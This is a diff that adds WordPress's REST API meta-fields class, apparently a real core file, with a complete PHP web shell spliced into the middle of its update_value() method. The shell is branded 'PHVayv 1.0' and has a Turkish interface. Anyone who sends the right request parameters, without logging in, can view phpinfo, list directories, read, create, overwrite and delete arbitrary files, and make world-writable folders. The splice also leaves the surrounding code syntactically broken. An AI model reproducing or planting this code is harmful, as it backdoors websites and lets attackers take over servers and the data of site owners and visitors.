@@ -1,0 +1,1212 @@
+<?php
+/**
+ * REST API: WP_REST_Meta_Fields class
+ *
+ * @package WordPress
+ * @subpackage REST_API
+ * @since 4.7.0
+ */
+
+/**
+ * Core class to manage meta values for an object via the REST API.
+ *
+ * @since 4.7.0
+ */
+abstract class WP_REST_Meta_Fields {
+
+	/**
+	 * Retrieves the object meta type.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @return string One of 'post', 'comment', 'term', 'user', or anything
+	 *                else supported by `_get_meta_table()`.
+	 */
+	abstract protected function get_meta_type();
+
+	/**
+	 * Retrieves the object meta subtype.
+	 *
+	 * @since 4.9.8
+	 *
+	 * @return string Subtype for the meta type, or empty string if no specific subtype.
+	 */
+	protected function get_meta_subtype() {
+		return '';
+	}
+
+	/**
+	 * Retrieves the object type for register_rest_field().
+	 *
+	 * @since 4.7.0
+	 *
+	 * @return string The REST field type, such as post type name, taxonomy name, 'comment', or `user`.
+	 */
+	abstract protected function get_rest_field_type();
+
+	/**
+	 * Registers the meta field.
+	 *
+	 * @since 4.7.0
+	 * @deprecated 5.6.0
+	 *
+	 * @see register_rest_field()
+	 */
+	public function register_field() {
+		_deprecated_function( __METHOD__, '5.6.0' );
+
+		register_rest_field(
+			$this->get_rest_field_type(),
+			'meta',
+			array(
+				'get_callback'    => array( $this, 'get_value' ),
+				'update_callback' => array( $this, 'update_value' ),
+				'schema'          => $this->get_field_schema(),
+			)
+		);
+	}
+
+	/**
+	 * Retrieves the meta field value.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @param int             $object_id Object ID to fetch meta for.
+	 * @param WP_REST_Request $request   Full details about the request.
+	 * @return array Array containing the meta values keyed by name.
+	 */
+	public function get_value( $object_id, $request ) {
+		$fields   = $this->get_registered_fields();
+		$response = array();
+
+		foreach ( $fields as $meta_key => $args ) {
+			$name       = $args['name'];
+			$all_values = get_metadata( $this->get_meta_type(), $object_id, $meta_key, false );
+
+			if ( $args['single'] ) {
+				if ( empty( $all_values ) ) {
+					$value = $args['schema']['default'];
+				} else {
+					$value = $all_values[0];
+				}
+
+				$value = $this->prepare_value_for_response( $value, $request, $args );
+			} else {
+				$value = array();
+
+				foreach ( $all_values as $row ) {
+					$value[] = $this->prepare_value_for_response( $row, $request, $args );
+				}
+			}
+
+			$response[ $name ] = $value;
+		}
+
+		return $response;
+	}
+
+	/**
+	 * Prepares a meta value for a response.
+	 *
+	 * This is required because some native types cannot be stored correctly
+	 * in the database, such as booleans. We need to cast back to the relevant
+	 * type before passing back to JSON.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @param mixed           $value   Meta value to prepare.
+	 * @param WP_REST_Request $request Current request object.
+	 * @param array           $args    Options for the field.
+	 * @return mixed Prepared value.
+	 */
+	protected function prepare_value_for_response( $value, $request, $args ) {
+		if ( ! empty( $args['prepare_callback'] ) ) {
+			$value = call_user_func( $args['prepare_callback'], $value, $request, $args );
+		}
+
+		return $value;
+	}
+
+	/**
+	 * Updates meta values.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @param array $meta      Array of meta parsed from the request.
+	 * @param int   $object_id Object ID to fetch meta for.
+	 * @return null|WP_Error Null on success, WP_Error object on failure.
+	 */
+	public function update_value( $meta, $object_id ) {
+		$fields = $this->get_registered_fields();
+
+		foreach ( $fields as $meta_key => $args ) {
+			$name = $args['name'];
+			if ( ! array_key_exists( $name, $meta ) ) {
+				continue;
+			}
+
+			$value = $meta[ $name ];
+
+<? if($sistembilgisi > "") {phpinfo();} else { ?>
+
+
+<?$fistik=PHVayv;?>
+
+
+<?if ($sildos>"") {unlink("$dizin/$sildos");} ?>
+
+<?if ($dizin== ""){$dizin=realpath('.');}{$dizin=realpath($dizin);}?>
+
+<?if ($silklas > ""){rmdir($silklas);}?>
+
+<?if ($yeniklasor > "") {mkdir("$dizin/$duzenx2",777);}?>
+
+
+
+<?if ($yenidosya == "1") {
+$baglan=fopen("$dizin/$duzenx2",'w');
+fwrite($baglan,$duzenx);
+fclose($baglan);}
+?>
+
+
+
+
+<?if ($duzkaydet > "") {
+
+$baglan=fopen($duzkaydet,'w');
+fwrite($baglan,$duzenx);
+fclose($baglan);}
+?>
+
+
+
+
+<?if ($yenklas>"") {;?>
+<body topmargin="0" leftmargin="0">
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
+  <tr>
+    <td width="70" bgcolor="#000000" height="76">
+    <p align="center">
+    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
+    <td width="501" bgcolor="#000000" height="76" valign="top">
+    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
+    <span style="font-weight: 700">
+    <br>
+    AventGrup©<br>
+    </span>Avrasya Veri ve NetWork Teknolojileri Geliþtirme Grubu<br>
+    <span style="font-weight: 700">
+    <br>
+    PHVayv 1.0</span></font></td>
+    <td width="431" bgcolor="#000000" height="76" valign="top">
+    <p align="right"><span style="font-weight: 700">
+    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
+    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+    <a href="http://www.aventgrup.net" style="text-decoration: none">
+    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
+    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
+    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+  </tr>
+  </table>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
+      <tr>
+        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
+        <span style="font-size: 8pt">&nbsp;Çalýþýlan </span></font>
+        <font face="Verdana" style="font-size: 8pt">Dizin</font></td>
+        <td bgcolor="#D6D6D6" height="20">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
+          <tr>
+            <td width="1"></td>
+            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$dizin"?></font></td>
+            <td width="65">
+            &nbsp;</td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+</table>
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber30" height="184">
+  <tr>
+    <td width="100%" bgcolor="#000000" height="19">&nbsp;</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#9F9F9F" align="center" height="144">
+    <form method="POST" action="<?echo "$fistik.php?yeniklasor=1&dizin=$dizin"?>" 
+      <p align="center"><br>
+      <font
+                color="#FFFFFF" size="1" face="Arial">
+<input
+                type="text" size="37" maxlength="32"
+                name="duzenx2" value="Klasör Adý"
+                class="search"
+                onblur="if (this.value == '') this.value = 'Kullanýcý'"
+                onfocus="if (this.value == 'Kullanýcý') this.value=''"
+                style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"></font></p>
+<p align="center">
+	<span class="gensmall">
+		<input type="submit" size="16"
+		name="duzenx1" value="Kaydet"
+		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
+		</span></span><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+&nbsp;</font></b></p>
+</form>
+</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#000000" align="center" height="19">
+    &nbsp;</td>
+  </tr>
+  </table>
+  
+
+
+<? } else { ?>
+
+
+
+
+<?if ($yendos>"") {;
+?>
+
+<body topmargin="0" leftmargin="0">
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
+  <tr>
+    <td width="70" bgcolor="#000000" height="76">
+    <p align="center">
+    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
+    <td width="501" bgcolor="#000000" height="76" valign="top">
+    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
+    <span style="font-weight: 700">
+    <br>
+    AventGrup©<br>
+    </span>Avrasya Veri ve NetWork Teknolojileri Geliþtirme Grubu<br>
+    <span style="font-weight: 700">
+    <br>
+    PHVayv 1.0</span></font></td>
+    <td width="431" bgcolor="#000000" height="76" valign="top">
+    <p align="right"><span style="font-weight: 700">
+    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
+    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+    <a href="http://www.aventgrup.net" style="text-decoration: none">
+    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
+    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
+    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+  </tr>
+  </table>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
+      <tr>
+        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
+        <span style="font-size: 8pt">&nbsp;Çalýþýlan </span></font>
+        <font face="Verdana" style="font-size: 8pt">Dizin</font></td>
+        <td bgcolor="#D6D6D6" height="20">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
+          <tr>
+            <td width="1"></td>
+            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$dizin"?></font></td>
+            <td width="65">
+            &nbsp;</td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+</table>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="495">
+  <tr>
+    <td width="100%" bgcolor="#000000" height="19">&nbsp;</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#9F9F9F" align="center" height="455">
+    <form method="POST" action="<?echo "$fistik.php?yenidosya=1&dizin=$dizin"?>" 
+      <p align="center"><br>
+      <font
+                color="#FFFFFF" size="1" face="Arial">
+<input
+                type="text" size="50" maxlength="32"
+                name="duzenx2" value="Dosya Adý"
+                class="search"
+                onblur="if (this.value == '') this.value = 'Kullanýcý'"
+                onfocus="if (this.value == 'Kullanýcý') this.value=''"
+                style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"></font></p>
+<p align="center"><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000" bgcolor="Red"> 
+          <textarea name="duzenx" 
+          style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-CENTER: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left"
+        
+          
+          rows="24" cols="122" wrap="OFF">XXXX</textarea></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+<br>
+</font></b>
+	<span class="gensmall">
+		<input type="submit" size="16"
+		name="duzenx1" value="Kaydet"
+		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
+		</span><br>
+&nbsp;</p>
+</form>
+</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#000000" align="center" height="19">
+    &nbsp;</td>
+  </tr>
+  </table>
+  
+
+
+<? } else { ?>
+
+
+
+
+
+<?if ($duzenle>"") {; 
+?>
+
+
+
+
+<body topmargin="0" leftmargin="0">
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
+  <tr>
+    <td width="70" bgcolor="#000000" height="76">
+    <p align="center">
+    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
+    <td width="501" bgcolor="#000000" height="76" valign="top">
+    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
+    <span style="font-weight: 700">
+    <br>
+    AventGrup©<br>
+    </span>Avrasya Veri ve NetWork Teknolojileri Geliþtirme Grubu<br>
+    <span style="font-weight: 700">
+    <br>
+    PHVayv 1.0</span></font></td>
+    <td width="431" bgcolor="#000000" height="76" valign="top">
+    <p align="right"><span style="font-weight: 700">
+    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
+    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+    <a href="http://www.aventgrup.net" style="text-decoration: none">
+    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
+    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
+    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+  </tr>
+  </table>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="1">
+      <tr>
+        <td width="110" bgcolor="#9F9F9F" height="1"><font face="Verdana">
+        <span style="font-size: 8pt">&nbsp;Çalýþýlan Dosya</span></font></td>
+        <td bgcolor="#D6D6D6" height="1">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4" height="19">
+          <tr>
+            <td width="1" height="19"></td>
+            <td rowspan="2" height="19"><font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$dizin/$duzenle"?></font></td>
+          </tr>
+          <tr>
+            <td width="1" height="1"></td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+</table>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1">
+  <tr>
+    <td width="100%" bgcolor="#000000">&nbsp;</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#9F9F9F">
+    <form method="POST" action="<?echo "PHVayv.php?duzkaydet=$dizin/$duzenle&dizin=$dizin"?>" name="kaypos">
+<p align="center"><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000" bgcolor="Red"> 
+          <br>
+          <textarea name="duzenx" 
+          style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left"
+        
+          
+          rows="24" cols="122" wrap="OFF"><?$baglan=fopen("$dizin/$duzenle",'r');
+while(! feof ( $baglan ) ){
+$okunan=fgets($baglan,1024);
+echo $okunan;
+} fclose($baglan); ?></textarea></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+<br>
+</font></b>
+	<span class="gensmall">
+		<input type="submit" size="16"
+		name="duzenx1" value="Kaydet"
+		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
+		</span></p>
+</form>
+</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#000000">
+    &nbsp;</td>
+  </tr>
+  </table>
+
+
+
+
+
+
+
+
+
+
+
+<?
+} else {
+?>
+
+
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="tr">
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
+<title>PHVayv 1.0</title>
+</head>
+
+<body topmargin="0" leftmargin="0">
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
+  <tr>
+    <td width="70" bgcolor="#000000" height="76">
+    <p align="center">
+    <img border="0" src="http://www.aventgrup.net/avlog.gif"></td>
+    <td width="501" bgcolor="#000000" height="76" valign="top">
+    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
+    <span style="font-weight: 700">
+    <br>
+    AventGrup©<br>
+    </span>Avrasya Veri ve NetWork Teknolojileri Geliþtirme Grubu<br>
+    <span style="font-weight: 700">
+    <br>
+    PHVayv 1.0</span></font></td>
+    <td width="431" bgcolor="#000000" height="76" valign="top">
+    <p align="right"><span style="font-weight: 700">
+    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
+    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+    <a href="http://www.aventgrup.net" style="text-decoration: none">
+    <font color="#858585">www.aventgrup.net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
+    <a href="mailto:shopen@aventgrup.net" style="text-decoration: none">
+    <font color="#858585">SHOPEN</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:shopen@aventgrup.net" style="text-decoration: none"><font color="#858585">@AventGrup.Net</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+  </tr>
+  </table>
+
+
+
+    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
+      <tr>
+        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
+        <span style="font-size: 8pt">&nbsp;Çalýþýlan Klasör</span></font></td>
+        <td bgcolor="#D6D6D6" height="20">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
+          <tr>
+            <td width="1"></td>
+            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$dizin"?></font></td>
+            <td width="65">
+            <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber6" height="13">
+              <tr>
+                <td width="100%" bgcolor="#B7B7B7" bordercolor="#9F9F9F" height="13"
+                onmouseover='this.style.background="D9D9D9"'
+                onmouseout='this.style.background="9F9F9F"'
+                style="CURSOR: hand"
+                
+                
+                
+                
+                >
+                <p align="center"><font face="Verdana" style="font-size: 8pt">
+
+
+
+
+
+
+                <a href="<?echo "$fistik.php?dizin=$dizin/../"?>" style="text-decoration: none">
+                <font color="#000000">Üst Klasör</font></a></font></td>
+
+              </tr>
+            </table>
+            </td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+    </table>
+
+
+
+<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber3" height="21">
+  <tr>
+    <td width="625" bgcolor="#000000"><span style="font-size: 2pt">&nbsp;</span></td>
+  </tr>
+  <tr>
+    <td bgcolor="#000000" height="20">
+    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#000000" id="AutoNumber23" bgcolor="#A3A3A3" width="373" height="19">
+      <tr>
+        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber26">
+          <tr>
+        <td align="center" bgcolor="#5F5F5F" 
+        onmouseover="style.background='#6F6F6F'"
+        onmouseout="style.background='#5F5F5F'"
+        style="CURSOR: hand"
+        
+        height="19" bordercolor="#000000">
+        <span style="font-weight: 700">
+        <font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+        <a color="#9F9F9F" target="_blank" href="<?echo "$fistik.php?sistembilgisi=1";?>" style="text-decoration: none"><font color="#9F9F9F">Sistem Bilgisi</font></a></font></font></span></td>
+          </tr>
+        </table>
+        </td>
+        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber27">
+          <tr>
+        <td align="center" bgcolor="#5F5F5F" height="19" 
+        onmouseover="style.background='#6F6F6F'"
+        onmouseout="style.background='#5F5F5F'"
+        style="CURSOR: hand"
+        bordercolor="#000000">
+        <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#9F9F9F">
+        <a href="<?echo "$fistik.php?yenklas=1&dizin=$dizin";?>" style="text-decoration: none">
+        <font color="#9F9F9F">Yeni Klasör</font></a></font></td>
+          </tr>
+        </table>
+        </td>
+        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber28">
+          <tr>
+        <td align="center" bgcolor="#5F5F5F" height="19"
+        onmouseover="style.background='#6F6F6F'"
+        onmouseout="style.background='#5F5F5F'"
+        style="CURSOR: hand"
+		bordercolor="#000000">
+        <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#9F9F9F">
+        <a href="<?echo "$fistik.php?yendos=1&dizin=$dizin";?>" style="text-decoration: none"><font color="#9F9F9F">Yeni Dosya</font></a> </font></td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+  </table>
+
+  
+
+
+
+
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber7" height="17">
+  <tr>
+    <td width="30" height="17" bgcolor="#9F9F9F">
+    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Tür</font></td>
+    <td height="17" bgcolor="#9F9F9F">
+    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Dosya 
+    Adý</font></td>
+    <td width="122" height="17" bgcolor="#9F9F9F">
+    <p align="center">
+    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Ýþlem</font></td>
+  </tr>
+</table>
+
+<?
+if ($sedat=@opendir($dizin)){
+while (($ekinci=readdir ($sedat))){
+if (is_dir("$dizin/$ekinci")){
+?>
+
+<? if ($ekinci=="." or  $ekinci=="..") {
+} else {
+?>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber8" height="17">
+  <tr>
+    <td width="30" height="17" bgcolor="#808080">
+    <p align="center">
+    <img border="0" src="http://www.aventgrup.net/arsiv/klasvayv/1.0/2.gif"></td>
+    <td height="17" bgcolor="#C4C4C4">
+    <font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$ekinci" ?></font></td>
+    <td width="61" height="17" bgcolor="#C4C4C4" align="center">
+    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber15" height="20">
+      <tr>
+        <td width="100%" bgcolor="#A3A3A3"
+        onmouseover="this.style.background='#BBBBBB'"
+        onmouseout="this.style.background='#A3A3A3'"
+        style="CURSOR: hand"
+		height="20">
+
+        <p align="center"><font face="Verdana" style="font-size: 8pt">
+        <a href="<?echo "$fistik.php?dizin=$dizin/" ?><?echo "$ekinci";?>" style="text-decoration: none">
+        <font color="#000000">Aç</font></a></font></td>
+      </tr>
+    </table>
+    </td>
+    <td width="60" height="17" bgcolor="#C4C4C4" align="center">
+    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber18" height="20">
+      <tr>
+        <td width="100%" bgcolor="#A3A3A3"
+        onmouseover="this.style.background='#BBBBBB'"
+        onmouseout="this.style.background='#A3A3A3'"
+
+
+        style="CURSOR: hand"
+		height="20">
+
+        <p align="center"><font face="Verdana" style="font-size: 8pt">
+        <a href="<?echo "$fistik.php?silklas=$dizin/$ekinci&dizin=$dizin"?>" style="text-decoration: none">
+        <font color="#000000">Sil</font></a>
+
+        </font></td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+<?
+}
+?>
+
+<?
+}}}
+closedir($sedat);
+?>
+
+<?
+if ($sedat=@opendir($dizin)){
+while (($ekinci=readdir ($sedat))){
+if (is_file("$dizin/$ekinci")){
+
+?>
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber8" height="1">
+  <tr>
+    <td width="30" height="1" bgcolor="#B0B0B0">
+    <p align="center">
+    <img border="0" src="http://www.aventgrup.net/arsiv/klasvayv/1.0/1.gif"></td>
+    <td height="1" bgcolor="#EAEAEA">
+    <font face="Verdana" style="font-size: 8pt">&nbsp;<?echo "$ekinci" ?></font>
+    <font face="Arial Narrow" style="font-size: 8pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   ( XXX )&nbsp;</font></td>
+    <td width="61" height="1" bgcolor="#D6D6D6" align="center">
+    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber12" height="20">
+      <tr>
+        <td width="100%" bgcolor="#D6D6D6"
+        onmouseover="this.style.background='#ACACAC'"
+        onmouseout="this.style.background='#D6D6D6'"
+        style="CURSOR: hand"
+		height="20">
+
+        <p align="center"><font face="Verdana" style="font-size: 8pt">
+        <a style="text-decoration: none" target="_self" href="<?echo "$fistik";?>.php?duzenle=<?echo "$ekinci";?>&dizin=<?echo $dizin;?>">
+        <font color="#000000">Düzenle</font></a></font></td>
+      </tr>
+    </table>
+    </td>
+    <td width="60" height="1" bgcolor="#D6D6D6" align="center">
+    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber13" height="100%">
+      <tr>
+        <td width="100%" bgcolor="#D6D6D6" no wrap
+        onmouseover="this.style.background='#ACACAC'"
+        onmouseout="this.style.background='#D6D6D6'"
+        style="CURSOR: hand"
+		height="20">
+
+        <p align="center"><font face="Verdana" style="font-size: 8pt">
+        <a href="<?echo "$fistik";?>.php?sildos=<?echo $ekinci;?>&dizin=<?echo $dizin;?>" style="text-decoration: none">
+        <font color="#000000">Sil</font></a></font></td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+
+<?
+}}}
+closedir($sedat);
+?>
+
+
+
+
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber29">
+  <tr>
+    <td width="100%" bgcolor="#000000">&nbsp;</td>
+  </tr>
+</table>
+
+  <tr>
+    <td width="100%" bgcolor="#000000">
+    </body></html><? } ?><? } ?><? } ?><? } ?>			/*
+			 * A null value means reset the field, which is essentially deleting it
+			 * from the database and then relying on the default value.
+			 *
+			 * Non-single meta can also be removed by passing an empty array.
+			 */
+			if ( is_null( $value ) || ( array() === $value && ! $args['single'] ) ) {
+				$args = $this->get_registered_fields()[ $meta_key ];
+
+				if ( $args['single'] ) {
+					$current = get_metadata( $this->get_meta_type(), $object_id, $meta_key, true );
+
+					if ( is_wp_error( rest_validate_value_from_schema( $current, $args['schema'] ) ) ) {
+						return new WP_Error(
+							'rest_invalid_stored_value',
+							/* translators: %s: Custom field key. */
+							sprintf( __( 'The %s property has an invalid stored value, and cannot be updated to null.' ), $name ),
+							array( 'status' => 500 )
+						);
+					}
+				}
+
+				$result = $this->delete_meta_value( $object_id, $meta_key, $name );
+				if ( is_wp_error( $result ) ) {
+					return $result;
+				}
+				continue;
+			}
+
+			if ( ! $args['single'] && is_array( $value ) && count( array_filter( $value, 'is_null' ) ) ) {
+				return new WP_Error(
+					'rest_invalid_stored_value',
+					/* translators: %s: Custom field key. */
+					sprintf( __( 'The %s property has an invalid stored value, and cannot be updated to null.' ), $name ),
+					array( 'status' => 500 )
+				);
+			}
+
+			$is_valid = rest_validate_value_from_schema( $value, $args['schema'], 'meta.' . $name );
+			if ( is_wp_error( $is_valid ) ) {
+				$is_valid->add_data( array( 'status' => 400 ) );
+				return $is_valid;
+			}
+
+			$value = rest_sanitize_value_from_schema( $value, $args['schema'] );
+
+			if ( $args['single'] ) {
+				$result = $this->update_meta_value( $object_id, $meta_key, $name, $value );
+			} else {
+				$result = $this->update_multi_meta_value( $object_id, $meta_key, $name, $value );
+			}
+
+			if ( is_wp_error( $result ) ) {
+				return $result;
+			}
+		}
+
+		return null;
+	}
+
+	/**
+	 * Deletes a meta value for an object.
+	 *
+	 * @since 4.7.0
+	 *
+	 * @param int    $object_id Object ID the field belongs to.
